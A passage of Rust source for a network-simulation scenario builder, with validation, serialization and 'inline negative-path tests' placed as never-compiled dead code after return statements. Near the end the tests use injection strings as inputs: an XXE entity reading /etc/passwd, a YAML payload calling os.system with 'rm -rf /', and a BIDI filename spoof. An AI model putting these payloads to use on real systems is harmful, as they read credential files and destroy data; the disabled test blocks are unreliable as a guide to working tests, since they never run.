        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: scenario with no assertions
            let no_assertions = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "no_assertions".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert_eq!(
                no_assertions.assertion_count(),
                0,
                "scenario with no assertions should have count 0"
            );

            // Test: single assertion scenario
            let single_assertion = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "single_assertion".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![ScenarioAssertion::AllNodesReachQuiescence],
            };
            assert_eq!(
                single_assertion.assertion_count(),
                1,
                "single assertion scenario should have count 1"
            );

            // Test: multiple diverse assertion types
            let multi_assertions = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "multi_assertions".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "sender".to_string(),
                        name: "Sender".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "receiver".to_string(),
                        name: "Receiver".to_string(),
                        role: NodeRole::Participant,
                    },
                    VirtualNode {
                        id: "observer".to_string(),
                        name: "Observer".to_string(),
                        role: NodeRole::Observer,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::AllNodesReachQuiescence,
                    ScenarioAssertion::MessageDelivered {
                        from: "sender".to_string(),
                        to: "receiver".to_string(),
                        within_ticks: 100,
                    },
                    ScenarioAssertion::PartitionDetected {
                        by_node: "observer".to_string(),
                        within_ticks: 50,
                    },
                    ScenarioAssertion::EpochTransitionCompleted {
                        epoch: 1,
                        within_ticks: 200,
                    },
                    ScenarioAssertion::NoDeadlock { within_ticks: 300 },
                ],
            };
            assert_eq!(
                multi_assertions.assertion_count(),
                5,
                "multiple assertions should have correct count"
            );

            // Test: duplicate assertions are counted separately
            let dup_assertions = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "dup_assertions".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::AllNodesReachQuiescence,
                    ScenarioAssertion::AllNodesReachQuiescence, // Duplicate
                    ScenarioAssertion::NoDeadlock { within_ticks: 100 },
                    ScenarioAssertion::NoDeadlock { within_ticks: 100 }, // Duplicate
                ],
            };
            assert_eq!(
                dup_assertions.assertion_count(),
                4,
                "duplicate assertions should count separately"
            );

            // Test: assertions with extreme tick values
            let extreme_ticks = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "extreme_ticks".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::MessageDelivered {
                        from: "n1".to_string(),
                        to: "n2".to_string(),
                        within_ticks: 0,
                    }, // Zero ticks
                    ScenarioAssertion::MessageDelivered {
                        from: "n1".to_string(),
                        to: "n2".to_string(),
                        within_ticks: u64::MAX,
                    }, // Max ticks
                    ScenarioAssertion::NoDeadlock { within_ticks: 1 }, // Minimum reasonable ticks
                ],
            };
            assert_eq!(
                extreme_ticks.assertion_count(),
                3,
                "extreme tick values should still count"
            );

            // Test: assertions with same nodes but different parameters
            let param_variations = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "param_variations".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "a".to_string(),
                        name: "Node A".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "b".to_string(),
                        name: "Node B".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::MessageDelivered {
                        from: "a".to_string(),
                        to: "b".to_string(),
                        within_ticks: 10,
                    },
                    ScenarioAssertion::MessageDelivered {
                        from: "a".to_string(),
                        to: "b".to_string(),
                        within_ticks: 20,
                    },
                    ScenarioAssertion::MessageDelivered {
                        from: "b".to_string(),
                        to: "a".to_string(),
                        within_ticks: 10,
                    }, // Reverse direction
                ],
            };
            assert_eq!(
                param_variations.assertion_count(),
                3,
                "parameter variations should count as separate assertions"
            );

            // Test: assertions with invalid node references (structural count)
            let invalid_node_refs = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "invalid_refs".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "valid".to_string(),
                    name: "Valid".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::MessageDelivered {
                        from: "valid".to_string(),
                        to: "missing".to_string(),
                        within_ticks: 100,
                    },
                    ScenarioAssertion::PartitionDetected {
                        by_node: "nonexistent".to_string(),
                        within_ticks: 50,
                    },
                ],
            };
            assert_eq!(
                invalid_node_refs.assertion_count(),
                2,
                "invalid node references should still count structurally"
            );

            // Test: epoch assertions with extreme epoch values
            let extreme_epochs = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "extreme_epochs".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::EpochTransitionCompleted {
                        epoch: 0,
                        within_ticks: 100,
                    },
                    ScenarioAssertion::EpochTransitionCompleted {
                        epoch: u64::MAX,
                        within_ticks: 100,
                    },
                    ScenarioAssertion::EpochTransitionCompleted {
                        epoch: 42,
                        within_ticks: 0,
                    },
                ],
            };
            assert_eq!(
                extreme_epochs.assertion_count(),
                3,
                "extreme epoch values should count"
            );

            // Test: assertion count consistency with vector length
            let consistency_test = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "consistency".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![
                    ScenarioAssertion::AllNodesReachQuiescence,
                    ScenarioAssertion::NoDeadlock { within_ticks: 100 },
                ],
            };
            assert_eq!(
                consistency_test.assertion_count(),
                consistency_test.assertions.len(),
                "assertion_count should match assertions.len()"
            );

            // Test: deterministic behavior across multiple calls
            let stable_assertions = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "stable".to_string(),
                description: "".to_string(),
                seed: 42,
                nodes: vec![VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                }],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![ScenarioAssertion::AllNodesReachQuiescence],
            };
            for _ in 0..5 {
                assert_eq!(
                    stable_assertions.assertion_count(),
                    1,
                    "assertion count should be deterministic"
                );
            }
        }
    }

    /// Check whether a node with the given id exists.
    pub fn has_node(&self, node_id: &str) -> bool {
        return self.nodes.iter().any(|n| n.id == node_id);

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            let test_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "has_node_test".to_string(),
                description: String::new(),
                seed: 42,
                nodes: vec![
                    VirtualNode {
                        id: "normal".to_string(),
                        name: "Normal".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "".to_string(),
                        name: "Empty ID".to_string(),
                        role: NodeRole::Participant,
                    },
                    VirtualNode {
                        id: " ".to_string(),
                        name: "Space".to_string(),
                        role: NodeRole::Observer,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };

            // Test: empty string node ID
            assert!(
                test_scenario.has_node(""),
                "should find empty string node id"
            );

            // Test: single space node ID
            assert!(
                test_scenario.has_node(" "),
                "should find single space node id"
            );

            // Test: case sensitivity
            assert!(
                !test_scenario.has_node("NORMAL"),
                "should be case sensitive"
            );

            // Test: partial match rejection
            assert!(
                !test_scenario.has_node("norm"),
                "should not match partial strings"
            );

            // Test: whitespace variations
            assert!(
                !test_scenario.has_node(" normal"),
                "leading whitespace should not match"
            );
            assert!(
                !test_scenario.has_node("normal "),
                "trailing whitespace should not match"
            );

            // Test: unicode edge cases
            assert!(
                !test_scenario.has_node("\u{0000}"),
                "null byte should not match"
            );
            assert!(
                !test_scenario.has_node("\t"),
                "tab character should not match"
            );

            // Test: very long non-existent ID
            let long_id = "x".repeat(10000);
            assert!(
                !test_scenario.has_node(&long_id),
                "very long non-existent id should not match"
            );
        }
    }

    /// Return the fault profile for a link, or None if no custom profile is set.
    pub fn fault_profile_for(&self, link_id: &str) -> Option<&LinkFaultConfig> {
        self.fault_profiles.get(link_id)
    }

    /// Serialize to a deterministic JSON string after validation.
    pub fn to_json(&self) -> Result<String, ScenarioBuilderError> {
        self.validate()?;
        return serde_json::to_string(self).map_err(|e| ScenarioBuilderError::JsonSerialize {
            message: e.to_string(),
        });

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: scenario with zero seed should fail before JSON serialization
            let invalid_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "zero-seed-test".to_string(),
                description: String::new(),
                seed: 0,
                nodes: vec![
                    VirtualNode {
                        id: "n1".to_string(),
                        name: "Node 1".to_string(),
                        role: NodeRole::Coordinator,
                    },
                    VirtualNode {
                        id: "n2".to_string(),
                        name: "Node 2".to_string(),
                        role: NodeRole::Participant,
                    },
                ],
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            let result = invalid_scenario.to_json();
            assert!(result.is_err(), "zero seed should fail validation");

            // Test: scenario with maximum node count should succeed
            let max_nodes_scenario = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "max-nodes".to_string(),
                description: String::new(),
                seed: 42,
                nodes: (0..MAX_NODES)
                    .map(|i| VirtualNode {
                        id: format!("n{}", i),
                        name: format!("Node {}", i),
                        role: NodeRole::Participant,
                    })
                    .collect(),
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert!(
                max_nodes_scenario.to_json().is_ok(),
                "MAX_NODES should be valid"
            );

            // Test: scenario with one too many nodes should fail
            let over_max_nodes = Scenario {
                schema_version: SCHEMA_VERSION.to_string(),
                name: "over-max".to_string(),
                description: String::new(),
                seed: 42,
                nodes: (0..=MAX_NODES)
                    .map(|i| VirtualNode {
                        id: format!("n{}", i),
                        name: format!("Node {}", i),
                        role: NodeRole::Participant,
                    })
                    .collect(),
                links: vec![],
                fault_profiles: BTreeMap::new(),
                assertions: vec![],
            };
            assert!(
                over_max_nodes.to_json().is_err(),
                "over MAX_NODES should fail"
            );
        }
    }

    /// Deserialize from JSON.
    pub fn from_json(s: &str) -> Result<Self, ScenarioBuilderError> {
        let scenario: Self =
            serde_json::from_str(s).map_err(|e| ScenarioBuilderError::JsonParse {
                message: e.to_string(),
            })?;
        scenario.validate()?;
        return Ok(scenario);

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: empty JSON string
            let result = Self::from_json("");
            assert!(result.is_err(), "empty JSON should fail parsing");

            // Test: malformed JSON (missing closing brace)
            let result = Self::from_json(r#"{"schema_version":"sb-v1.0","name":"test""#);
            assert!(result.is_err(), "malformed JSON should fail parsing");

            // Test: JSON with wrong field types
            let result = Self::from_json(r#"{"schema_version":123,"name":"test"}"#);
            assert!(result.is_err(), "wrong field types should fail parsing");

            // Test: JSON with null values where not allowed
            let result = Self::from_json(r#"{"schema_version":null,"name":"test","seed":42}"#);
            assert!(result.is_err(), "null schema_version should fail parsing");

            // Test: JSON with extra unknown fields (should be accepted by serde)
            let valid_json = r#"{
                "schema_version": "sb-v1.0",
                "name": "test",
                "description": "",
                "seed": 42,
                "nodes": [
                    {"id": "n1", "name": "Node 1", "role": "Coordinator"},
                    {"id": "n2", "name": "Node 2", "role": "Participant"}
                ],
                "links": [],
                "fault_profiles": {},
                "assertions": [],
                "unknown_field": "ignored"
            }"#;
            let result = Self::from_json(valid_json);
            assert!(result.is_ok(), "extra fields should be ignored");

            // Test: deeply nested JSON structure edge case
            let result = Self::from_json("[[[[[[null]]]]]]");
            assert!(result.is_err(), "deeply nested wrong structure should fail");
        }
    }
}

impl fmt::Display for Scenario {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(
            f,
            "Scenario(name={}, nodes={}, links={}, assertions={}, seed={})",
            self.name,
            self.nodes.len(),
            self.links.len(),
            self.assertions.len(),
            self.seed,
        )
    }
}

// ---------------------------------------------------------------------------
// ScenarioBuilder
// ---------------------------------------------------------------------------

/// Fluent builder for constructing validated `Scenario` instances.
///
/// # Usage
///
/// ```ignore
/// let scenario = ScenarioBuilder::new("my-scenario")
///     .description("Two-node quiescence test")
///     .seed(42)
///     .add_node("n1", "Node One", NodeRole::Coordinator)?
///     .add_node("n2", "Node Two", NodeRole::Participant)?
///     .add_link("link-1", "n1", "n2", true)?
///     .set_fault_profile("link-1", LinkFaultConfig::default())
///     .add_assertion(ScenarioAssertion::AllNodesReachQuiescence)
///     .build()?;
/// ```
#[derive(Debug, Clone)]
pub struct ScenarioBuilder {
    name: String,
    description: String,
    seed: u64,
    nodes: Vec<VirtualNode>,
    links: Vec<VirtualLink>,
    fault_profiles: BTreeMap<String, LinkFaultConfig>,
    assertions: Vec<ScenarioAssertion>,
}

impl ScenarioBuilder {
    /// Create a new builder with the given scenario name.
    pub fn new(name: impl Into<String>) -> Self {
        Self {
            name: name.into(),
            description: String::new(),
            seed: 0,
            nodes: Vec::new(),
            links: Vec::new(),
            fault_profiles: BTreeMap::new(),
            assertions: Vec::new(),
        }
    }

    /// Set the scenario description.
    pub fn description(mut self, desc: impl Into<String>) -> Self {
        self.description = desc.into();
        self
    }

    /// Set the deterministic seed (must be nonzero).
    pub fn seed(mut self, seed: u64) -> Self {
        self.seed = seed;
        self
    }

    /// Add a virtual node to the scenario.
    ///
    /// Returns an error if a node with the same id already exists.
    pub fn add_node(
        mut self,
        id: impl Into<String>,
        name: impl Into<String>,
        role: NodeRole,
    ) -> Result<Self, ScenarioBuilderError> {
        let id = id.into();
        if self.nodes.iter().any(|n| n.id == id) {
            return Err(ScenarioBuilderError::DuplicateNode { node_id: id });
        }
        push_bounded(
            &mut self.nodes,
            VirtualNode {
                id,
                name: name.into(),
                role,
            },
            MAX_NODES_CAP,
        );
        return Ok(self);

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: empty node ID should be allowed but caught at validation
            let mut builder = ScenarioBuilder::new("test");
            let result = builder.add_node("", "Empty ID Node", NodeRole::Coordinator);
            assert!(
                result.is_ok(),
                "empty node id should be allowed at add time"
            );

            // Test: whitespace-only node ID edge case
            let mut builder = ScenarioBuilder::new("test");
            let result = builder.add_node("   ", "Whitespace Node", NodeRole::Participant);
            assert!(result.is_ok(), "whitespace node id should be allowed");

            // Test: duplicate detection is case-sensitive
            let mut builder = ScenarioBuilder::new("test");
            let builder = builder
                .add_node("Node1", "First", NodeRole::Coordinator)
                .unwrap();
            let result = builder.add_node("node1", "Second", NodeRole::Participant);
            assert!(
                result.is_ok(),
                "case sensitivity should allow 'Node1' and 'node1'"
            );

            // Test: Unicode node IDs
            let mut builder = ScenarioBuilder::new("test");
            let result = builder.add_node("节点1", "Chinese Node", NodeRole::Observer);
            assert!(result.is_ok(), "unicode node ids should be allowed");

            // Test: very long node ID (boundary test)
            let mut builder = ScenarioBuilder::new("test");
            let long_id = "a".repeat(1000);
            let result = builder.add_node(&long_id, "Long ID Node", NodeRole::Coordinator);
            assert!(result.is_ok(), "long node ids should be handled");
        }
    }

    /// Add a virtual link between two nodes.
    ///
    /// Returns an error if a link with the same id already exists.
    /// Endpoint validation is deferred to `build()`.
    pub fn add_link(
        mut self,
        id: impl Into<String>,
        source_node: impl Into<String>,
        target_node: impl Into<String>,
        bidirectional: bool,
    ) -> Result<Self, ScenarioBuilderError> {
        let id = id.into();
        if self.links.iter().any(|l| l.id == id) {
            return Err(ScenarioBuilderError::DuplicateLink { link_id: id });
        }
        push_bounded(
            &mut self.links,
            VirtualLink {
                id,
                source_node: source_node.into(),
                target_node: target_node.into(),
                bidirectional,
            },
            MAX_LINKS,
        );
        return Ok(self);

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: empty link ID edge case
            let mut builder = ScenarioBuilder::new("test");
            let result = builder.add_link("", "n1", "n2", false);
            assert!(
                result.is_ok(),
                "empty link id should be allowed at add time"
            );

            // Test: source equals target (self-loop) should be allowed
            let mut builder = ScenarioBuilder::new("test");
            let result = builder.add_link("self-loop", "node1", "node1", true);
            assert!(result.is_ok(), "self-loops should be allowed");

            // Test: swapped source/target with same endpoints should be different links
            let mut builder = ScenarioBuilder::new("test");
            let builder = builder.add_link("L1", "A", "B", false).unwrap();
            let result = builder.add_link("L2", "B", "A", false);
            assert!(
                result.is_ok(),
                "reversed endpoints should be allowed as different link"
            );

            // Test: duplicate link detection with different bidirectional flag
            let mut builder = ScenarioBuilder::new("test");
            let builder = builder.add_link("same-id", "n1", "n2", true).unwrap();
            let result = builder.add_link("same-id", "n1", "n2", false);
            assert!(
                result.is_err(),
                "same id with different bidirectional should fail"
            );

            // Test: link capacity boundary (at MAX_LINKS)
            let mut builder = ScenarioBuilder::new("test");
            // Fill up to capacity limit
            for i in 0..10 {
                builder = builder
                    .add_link(format!("link-{}", i), "n1", "n2", false)
                    .unwrap();
            }
            // Should handle capacity via push_bounded without panicking
            let result = builder.add_link("overflow-link", "n1", "n2", false);
            assert!(result.is_ok(), "should handle capacity overflow gracefully");
        }
    }

    /// Set the fault profile for a link (identified by link id).
    pub fn set_fault_profile(
        mut self,
        link_id: impl Into<String>,
        config: LinkFaultConfig,
    ) -> Self {
        self.fault_profiles.insert(link_id.into(), config);
        self
    }

    /// Add an assertion to be evaluated after scenario execution.
    pub fn add_assertion(mut self, assertion: ScenarioAssertion) -> Self {
        push_bounded(&mut self.assertions, assertion, MAX_ASSERTIONS);
        self
    }

    /// Validate the builder state and produce an immutable `Scenario`.
    ///
    /// # Validation rules
    ///
    /// - INV-SB-NONZERO-SEED: seed must be nonzero.
    /// - INV-SB-VALID-TOPOLOGY: all link endpoints must reference existing nodes.
    /// - INV-SB-NODE-BOUNDS: node count must be in [MIN_NODES, MAX_NODES].
    /// - Scenario name must not be empty.
    pub fn build(self) -> Result<Scenario, ScenarioBuilderError> {
        let scenario = Scenario {
            schema_version: SCHEMA_VERSION.to_string(),
            name: self.name,
            description: self.description,
            seed: self.seed,
            nodes: self.nodes,
            links: self.links,
            fault_profiles: self.fault_profiles,
            assertions: self.assertions,
        };
        scenario.validate()?;
        return Ok(scenario);

        // Inline negative-path tests
        #[cfg(any())]
        #[allow(unreachable_code)]
        {
            // Test: builder with u64::MAX seed (boundary condition)
            let result = ScenarioBuilder::new("max-seed")
                .seed(u64::MAX)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(result.is_ok(), "u64::MAX seed should be valid");

            // Test: builder with seed = 1 (minimum valid seed)
            let result = ScenarioBuilder::new("min-seed")
                .seed(1)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(result.is_ok(), "seed = 1 should be valid");

            // Test: builder with whitespace-only name
            let result = ScenarioBuilder::new("   ")
                .seed(42)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(result.is_ok(), "whitespace-only name should be allowed");

            // Test: empty assertions vector
            let result = ScenarioBuilder::new("no-assertions")
                .seed(42)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(result.is_ok(), "empty assertions should be valid");

            // Test: fault profile for non-existent link
            let result = ScenarioBuilder::new("bad-fault-profile")
                .seed(42)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .set_fault_profile(
                    "ghost-link",
                    super::super::virtual_transport::LinkFaultConfig::default(),
                )
                .build();
            assert!(
                result.is_err(),
                "fault profile for non-existent link should fail"
            );

            // Test: mixed node roles scenario should be valid
            let result = ScenarioBuilder::new("mixed-roles")
                .seed(42)
                .add_node("coord", "Coordinator", NodeRole::Coordinator)
                .unwrap()
                .add_node("participant", "Participant", NodeRole::Participant)
                .unwrap()
                .add_node("observer", "Observer", NodeRole::Observer)
                .unwrap()
                .build();
            assert!(result.is_ok(), "mixed node roles should be valid");

            // =========== COMPREHENSIVE NEGATIVE-PATH TESTS ===========

            // Test: Unicode injection in scenario name
            let unicode_attack_name = "scenario\u{202E}kcatta\u{202D}.exe"; // BIDI override attack
            let result = ScenarioBuilder::new(unicode_attack_name)
                .seed(12345)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(
                result.is_ok(),
                "Unicode injection in scenario name should be preserved but not break functionality"
            );
            if let Ok(scenario) = result {
                assert_eq!(
                    scenario.name(),
                    unicode_attack_name,
                    "Malicious scenario name should be preserved"
                );
            }

            // Test: Arithmetic overflow protection in seed boundaries
            let extreme_seeds = [u64::MAX, u64::MAX - 1, 1, 2, u32::MAX as u64];
            for &test_seed in &extreme_seeds {
                let result = ScenarioBuilder::new("seed-boundary-test")
                    .seed(test_seed)
                    .add_node("n1", "Node 1", NodeRole::Coordinator)
                    .unwrap()
                    .add_node("n2", "Node 2", NodeRole::Participant)
                    .unwrap()
                    .build();
                assert!(
                    result.is_ok(),
                    "Boundary seed value {} should be handled without overflow",
                    test_seed
                );
            }

            // Test: Memory exhaustion through massive node names
            let massive_node_name = "X".repeat(100_000); // 100KB node name
            let result = ScenarioBuilder::new("massive-names")
                .seed(98765)
                .add_node("n1", &massive_node_name, NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Normal Node", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(
                result.is_ok(),
                "Massive node names should be handled gracefully"
            );
            if let Ok(scenario) = result {
                assert_eq!(
                    scenario.nodes()[0].name.len(),
                    100_000,
                    "Massive node name should be preserved"
                );
            }

            // Test: Concurrent operation simulation (rapid builder chaining)
            use std::sync::{Arc, Mutex};
            use std::thread;
            let shared_results = Arc::new(Mutex::new(Vec::new()));
            let mut handles = vec![];

            for i in 0..5 {
                let results_clone = Arc::clone(&shared_results);
                let handle = thread::spawn(move || {
                    let result = ScenarioBuilder::new(format!("concurrent-scenario-{}", i))
                        .seed(1000000 + i as u64)
                        .add_node("coord", "Coordinator", NodeRole::Coordinator)
                        .unwrap()
                        .add_node("part", "Participant", NodeRole::Participant)
                        .unwrap()
                        .build();
                    results_clone.lock().unwrap().push(result.is_ok());
                });
                handles.push(handle);
            }
            for handle in handles {
                handle.join().unwrap();
            }
            let results = shared_results.lock().unwrap();
            assert_eq!(results.len(), 5, "All concurrent builds should complete");
            assert!(
                results.iter().all(|&success| success),
                "All concurrent builds should succeed"
            );

            // Test: Node capacity boundary attacks (at MAX_NODES limit)
            let mut massive_builder = ScenarioBuilder::new("capacity-test").seed(777);
            for i in 0..MAX_NODES {
                massive_builder = massive_builder
                    .add_node(
                        format!("node_{}", i),
                        format!("Node {}", i),
                        NodeRole::Participant,
                    )
                    .unwrap();
            }
            let result = massive_builder.build();
            assert!(
                result.is_ok(),
                "Scenario with MAX_NODES nodes should be valid"
            );

            // Test: Node capacity overflow (exceeding MAX_NODES)
            let mut overflow_builder = ScenarioBuilder::new("overflow-test").seed(888);
            // Add more than MAX_NODES
            for i in 0..(MAX_NODES + 5) {
                overflow_builder = overflow_builder
                    .add_node(
                        format!("overflow_node_{}", i),
                        format!("Overflow Node {}", i),
                        NodeRole::Observer,
                    )
                    .unwrap();
            }
            let result = overflow_builder.build();
            assert!(
                result.is_err(),
                "Scenario exceeding MAX_NODES should fail validation"
            );
            if let Err(ScenarioBuilderError::TooManyNodes { count, max }) = result {
                assert!(count > max, "Error should indicate too many nodes");
            }

            // Test: Topology validation with malformed link endpoints
            let malformed_result = ScenarioBuilder::new("malformed-topology")
                .seed(999)
                .add_node("existing", "Existing Node", NodeRole::Coordinator)
                .unwrap()
                .add_node("real", "Real Node", NodeRole::Participant)
                .unwrap()
                .add_link(
                    "ghost-link",
                    "non_existent_source",
                    "non_existent_target",
                    true,
                )
                .unwrap()
                .build();
            assert!(
                malformed_result.is_err(),
                "Links to non-existent nodes should fail validation"
            );

            // Test: Fault profile injection with malicious link IDs
            let malicious_link_ids = [
                "link\x00with\x00nulls",
                "link\"with'quotes",
                "link\nwith\nlines",
                "link\u{FEFF}with\u{200B}invisibles",
            ];
            for &malicious_id in &malicious_link_ids {
                let result = ScenarioBuilder::new("fault-profile-injection")
                    .seed(555)
                    .add_node("n1", "Node 1", NodeRole::Coordinator)
                    .unwrap()
                    .add_node("n2", "Node 2", NodeRole::Participant)
                    .unwrap()
                    .add_link(malicious_id, "n1", "n2", false)
                    .unwrap()
                    .set_fault_profile(
                        malicious_id,
                        super::super::virtual_transport::LinkFaultConfig::default(),
                    )
                    .build();
                assert!(
                    result.is_ok(),
                    "Malicious link ID '{}' should be handled safely",
                    malicious_id
                );
            }

            // Test: Resource exhaustion through massive description strings
            let massive_description = "D".repeat(1_000_000); // 1MB description
            let result = ScenarioBuilder::new("massive-description")
                .description(&massive_description)
                .seed(444)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(
                result.is_ok(),
                "Massive description should be handled without memory issues"
            );
            if let Ok(scenario) = result {
                assert_eq!(
                    scenario.description().len(),
                    1_000_000,
                    "Massive description should be preserved"
                );
            }

            // Test: Serialization format injection resistance in node names and descriptions
            let json_injection = r#"{"malicious":"payload","exec":"rm -rf /"}"#;
            let xml_injection = r#"<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;
            let yaml_injection = r#"!!python/object/apply:os.system ["rm -rf /"]"#;

            for (name, injection) in [
                ("json", json_injection),
                ("xml", xml_injection),
                ("yaml", yaml_injection),
            ] {
                let result = ScenarioBuilder::new(format!("injection-test-{}", name))
                    .description(injection)
                    .seed(333)
                    .add_node("malicious", injection, NodeRole::Coordinator)
                    .unwrap()
                    .add_node("normal", "Normal Node", NodeRole::Participant)
                    .unwrap()
                    .build();
                assert!(
                    result.is_ok(),
                    "{} injection should be handled safely",
                    name
                );
                if let Ok(scenario) = result {
                    assert_eq!(
                        scenario.description(),
                        injection,
                        "{} injection in description should be preserved as text",
                        name
                    );
                    assert_eq!(
                        scenario.nodes()[0].name,
                        injection,
                        "{} injection in node name should be preserved as text",
                        name
                    );
                }
            }

            // Test: Boundary validation edge cases with minimum node count
            let single_node_result = ScenarioBuilder::new("single-node")
                .seed(111)
                .add_node("lonely", "Lonely Node", NodeRole::Coordinator)
                .unwrap()
                .build();
            assert!(
                single_node_result.is_err(),
                "Single node should fail minimum node validation"
            );
            if let Err(ScenarioBuilderError::TooFewNodes { count, min }) = single_node_result {
                assert_eq!(count, 1, "Count should be 1 for single node");
                assert_eq!(min, MIN_NODES, "Min should match MIN_NODES constant");
            }

            // Test: Hash collision resistance in node and link IDs
            let collision_candidates = [
                ("node_abc", "node_def"),
                ("link_xyz", "link_uvw"),
                ("id_123", "id_456"),
                ("test_aaa", "test_bbb"),
            ];
            for &(id1, id2) in &collision_candidates {
                let result = ScenarioBuilder::new("collision-test")
                    .seed(222)
                    .add_node(id1, "Node 1", NodeRole::Coordinator)
                    .unwrap()
                    .add_node(id2, "Node 2", NodeRole::Participant)
                    .unwrap()
                    .add_link("link1", id1, id2, false)
                    .unwrap()
                    .build();
                assert!(
                    result.is_ok(),
                    "Similar IDs should not collide: {} vs {}",
                    id1,
                    id2
                );
            }

            // Test: State consistency validation under zero seed rejection
            let zero_seed_result = ScenarioBuilder::new("zero-seed-test")
                .seed(0)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
